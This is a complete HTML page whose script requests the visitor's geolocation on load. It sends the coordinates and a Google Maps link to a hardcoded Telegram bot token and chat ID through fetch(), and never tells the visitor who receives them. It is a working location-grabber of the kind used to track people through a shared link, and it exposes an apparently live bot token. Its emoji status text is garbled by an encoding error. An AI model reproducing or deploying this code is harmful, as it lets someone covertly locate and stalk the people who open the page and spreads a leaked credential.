<!DOCTYPE html>
<html>
<head>
    <title>Sending Location</title>
</head>
<body>
    <h2>Automatically Sending Your Location...</h2>
    <p id="status">Please allow location access.</p>

    <script>
        // Automatically request location when the page loads
        window.onload = function () {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError);
            } else {
                document.getElementById("status").innerText = "‚ùå Your browser does not support location tracking.";
            }
        };

        function sendLocation(position) {
            let lat = position.coords.latitude;
            let lon = position.coords.longitude;
            let botToken = "7927161012:AAFzGfXcqc57dqbGxeRGmbAONzGeF6TFkyY";  // Your bot token
            let chatId = "6340045158";  // Your chat ID

            let message = `üìç User Location: \nüåç Latitude: ${lat}\nüåé Longitude: ${lon}\nüîó Google Maps: https://www.google.com/maps?q=${lat},${lon}`;

            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => {
                    if (response.ok) {
                        document.getElementById("status").innerText = "‚úÖ Location sent successfully!";
                    } else {
                        document.getElementById("status").innerText = "‚ùå Failed to send location.";
                    }
                })
                .catch(error => {
                    document.getElementById("status").innerText = "‚ùå Connection error.";
                });
        }

        function showError(error) {
            let message = "";
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    message = "‚ùå You denied location access.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    message = "‚ö†Ô∏è Location information is unavailable.";
                    break;
                case error.TIMEOUT:
                    message = "‚è≥ Location request timed out.";
                    break;
                default:
                    message = "‚ùå An unknown error occurred.";
            }
            document.getElementById("status").innerText = message;
        }
    </script>
</body>
</html>
